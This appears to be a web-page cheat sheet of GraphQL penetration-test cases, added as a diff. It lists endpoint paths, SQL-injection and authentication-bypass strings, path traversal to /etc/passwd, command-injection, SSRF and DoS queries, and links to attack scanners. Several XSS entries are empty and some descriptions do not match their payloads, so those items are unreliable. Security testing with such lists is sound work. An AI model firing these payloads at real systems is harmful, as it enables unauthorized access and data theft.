@@ -1,0 +1,270 @@
+
+Twitter LinkedIn GitHub
+GraphQL Test Cases
+	Name 	Description 	Payload
+	GraphQL API endpoint	
+Common endpoint for GraphQL APIs
+	
+{
+    "query": [
+        "/graphql",
+        "/api/graphql",
+        "/api/v1/graphql",
+        "/graphql-server",
+        "/graphql-service",
+        "/graphql-api",
+        "/graphql-endpoint",
+        "/graphql-console",
+        "/graphql-explorer",
+        "/graphql-playground",
+        "/graphql-dev",
+        "/graphqld",
+        "/gql",
+        "/graphql/schema",
+        "/graphql/query",
+        "/graphql/mutation",
+        "/graphql/subscriptions"
+    ]
+}
+	GraphQL API endpoint - Extended List	
+Possible endpoint for GraphQL APIs
+	
+{
+    "query": "https://raw.githubusercontent.com/anmolksachan/anmolksachan.github.io/main/graphql/graphql-common.txt"
+}
+	Introspection query	
+Verify that the introspection query is disabled
+	
+{
+    "query": "{__schema{types{name}}}"
+}
+	SQL Injection	
+Attempt to perform SQL injection
+	
+{
+    "query": "query{users(where:{name:{_eq:\"' or 1=1 --\"}}){id,name}}"
+}
+	Cross-site scripting (XSS)	
+Attempt to perform a cross-site scripting attack
+	
+{
+    "query": "query{users(where:{name:{_contains:\"\"}}){id,name}}"
+}
+	Path Traversal	
+Attempt to perform path traversal
+	
+{
+    "query": "query{file(path:\"../etc/passwd\"){name}}"
+}
+	Command Injection	
+Attempt to perform command injection
+	
+{
+    "query": "query{runCommand(command:\"ls -la\")}"
+}
+	Authentication Bypass	
+Attempt to bypass authentication
+	
+{
+    "query": "query{user(id:\"1\"){id,name,email}}"
+}
+	Authorization Bypass	
+Attempt to bypass authorization
+	
+{
+    "query": "query{secretData}"
+}
+	SQL Injection - UNION attack	
+Attempt to perform a SQL injection using UNION
+	
+{
+    "query": "query{users(where:{name:{_eq:\"' UNION SELECT * FROM users WHERE '1'='1\"}}){id,name}}"
+}
+	XSS - Script tag bypass	
+Attempt to perform a cross-site scripting attack using script tag bypass
+	
+{
+    "query": "query{users(where:{name:{_neq:\"\"}, name:{_contains:\"\"}}){id,name}}"
+}
+	Path Traversal - Absolute path	
+Attempt to perform path traversal using an absolute path
+	
+{
+    "query": "query{file(path:\"/etc/passwd\"){name}}"
+}
+	Command Injection - Arbitrary command execution	
+Attempt to execute an arbitrary command using command injection
+	
+{
+    "query": "query{runCommand(command:\"cat /etc/passwd\")}"
+}
+	Authentication Bypass - SQL Injection	
+Attempt to bypass authentication using SQL Injection
+	
+{
+    "query": "query{user(where:{email:{_eq:\"admin'--\"}, password:{_eq:\"' OR '1'='1\"}}){id,name,email}}"
+}
+	Authorization Bypass - Forced browsing	
+Attempt to bypass authorization using forced browsing
+	
+{
+    "query": "query{file(path:\"/secret.txt\"){name, content}}"
+}
+	No query	
+Attempt to send a request without a query parameter
+	
+{
+    "variables": {}
+}
+	Empty query	
+Attempt to send an empty query parameter
+	
+{
+    "query": "",
+    "variables": {}
+}
+	Invalid query parameter	
+Attempt to send an invalid query parameter
+	
+{
+    "query": "invalidquery",
+    "variables": {}
+}
+	Invalid variable type	
+Attempt to send a variable with an invalid type
+	
+{
+    "query": "query{users(where:{name:{_eq:$name}}){id,name}}",
+    "variables": {
+        "name": {
+            "invalid": "type"
+        }
+    }
+}
+	Missing required variable	
+Attempt to send a request without a required variable
+	
+{
+    "query": "query{user(where:{email:{_eq:$email}}){id,name,email}}",
+    "variables": {
+        "name": "testuser"
+    }
+}
+	Numeric SQL injection	
+Attempt to perform numeric SQL injection
+	
+{
+    "query": "query{users(where:{id:{_eq:\"1' or 1=1 --\"}}){id,name}}"
+}
+	Blind SQL injection	
+Attempt to perform blind SQL injection
+	
+{
+    "query": "query{users(where:{name:{_eq:\"admin\"},password:{_like:\"%$password%\"}}){id,name}}"
+}
+	Server-side request forgery (SSRF)	
+Attempt to perform server-side request forgery
+	
+{
+    "query": "query{fetchUrl(url:\"https://example.com\")}"
+}
+	Denial of Service (DoS)	
+Attempt to perform a DoS attack
+	
+{
+    "query": "query{users{...largeFragment}}fragment largeFragment on User{name}}"
+}
+	GraphQL injection	
+Attempt to perform GraphQL injection
+	
+{
+    "query": "mutation{addUser(input:{name:\"testuser\",email:\"testuser@example.com\"}){user{id,name,email}}}"
+}
+	Information disclosure	
+Attempt to access sensitive information
+	
+{
+    "query": "query{user(id:\"2\"){id,name,email,password}}"
+}
+	Cross-site request forgery (CSRF)	
+Attempt to perform cross-site request forgery
+	
+{
+    "query": "mutation{updateUser(id:\"1\",input:{name:\"hacked\"}){user{id,name,email}}}"
+}
+	Mutation without authentication	
+Attempt to execute a mutation without authentication
+	
+{
+    "query": "mutation{createPost(title:\"New Post\", content:\"Content of the post\"){id,title,content}}"
+}
+	Mutation with insufficient permissions	
+Attempt to execute a mutation with insufficient permissions
+	
+{
+    "query": "mutation{deletePost(id:\"1\"){id,title,content}}"
+}
+	Query with invalid argument	
+Attempt to execute a query with an invalid argument
+	
+{
+    "query": "query{post(id:\"not_an_integer\"){id,title,content}}"
+}
+	Query with too many results	
+Attempt to execute a query with too many results
+	
+{
+    "query": "query{posts{title}}"
+}
+	Query with too few results	
+Attempt to execute a query with too few results
+	
+{
+    "query": "query{post(id:\"999\"){title}}"
+}
+	Malformed query	
+Attempt to execute a malformed query
+	
+{
+    "query": "query{post(id:\"1\"){title, content}}"
+}
+	Subquery depth limit exceeded	
+Attempt to execute a query with too many nested subqueries
+	
+{
+    "query": "query{post(id:\"1\"){title, comments{content, user{posts{content}}}}}"
+}
+	Query with long execution time	
+Attempt to execute a query that takes a long time to complete
+	
+{
+    "query": "query{longRunningQuery}"
+}
+	Vulnerability scanner - GraphCrawler	
+Toolkit that can be used to grab schemas and search for sensative data, test authorization, brute force schemas, and find paths to a given type.
+	
+{
+    "query": "https://github.com/gsmith257-cyber/GraphCrawler"
+}
+	Vulnerability scanner - GraphQLmap	
+Can be used as a CLI client also to automate attacks.
+	
+{
+    "query": "https://github.com/swisskyrepo/GraphQLmap"
+}
+	Vulnerability scanner - graphql-path-enum	
+Tool that lists the different ways of reaching a given type in a GraphQL schema.
+	
+{
+    "query": "https://gitlab.com/dee-see/graphql-path-enum"
+}
+	GraphQLmap	
+Can be used as a CLI client also to automate attacks
+	
+{
+    "query": [
+        "https://github.com/swisskyrepo/GraphQLmap"
+    ]
+}
+
+Developed with ❤️ by Anmol K Sachan | Follow me @FR13ND0x7f © 2023
